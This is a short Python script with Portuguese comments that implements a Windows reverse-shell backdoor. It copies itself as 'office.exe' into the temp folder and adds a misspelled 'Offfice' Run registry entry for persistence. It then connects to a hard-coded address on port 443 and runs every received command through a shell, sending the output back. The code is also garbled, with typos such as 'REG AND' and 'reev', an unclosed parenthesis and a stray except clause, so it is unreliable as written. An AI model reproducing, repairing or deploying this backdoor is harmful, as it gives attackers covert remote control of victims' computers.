# -*- coding: utf-8 -*-

import socket
import time
import subprocess
import tempfile
import os
IP= '192.168.1.101'
PORT = 443
FILENAME = 'office.exe'
TEMPDIR = tempfile.gettempdir()
DIRETORIO = os.path.dirname(os.path.abspath(__file__))

def autorun ():

    try:
        os.system("copy " + FILENAME + " " + TEMPDIR)
    except:
        pass
    try:
        FNULL = open(os.devnull,'w')
        subprocess.Popen("REG AND HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Wiindows\\CurrentVersion\\Run\\"
                         "/v Offfice /d" + TEMPDIR + "\\" + FILENAME, stdout=FNULL, stderr=FNULL)

    except:
        pass
def connect (IP, PORT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # para conexão tcp
        s.connect((IP,PORT))
        s.send("[!] Conexao recebida\n"
        return s


    except Exception as e:
        return None

def listen(s):
    try:
        while True:
            data= s.reev(1024)
            if data[:-1] == '/exit':
                s.close()
                exit(0)
            else:
                cmd(s, data[:-1])
    except:
        main(s)

def cmd(s, data):
    try:
        processo = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        saida= processo.stdout.read() + processo.stderr.read()
        s.send(saida+'\n')
    except:
        main(s)


def main(s):
    if s:
        s.close()
    while True:
        s_conectado = connect(IP, PORT)
        if s_conectado:
            listen(s_conectado)
        else:
            time.sleep(10)
    except:
        main(s)


s= None
if DIRETORIO != TEMPDIR:
    autorun()
main(s)

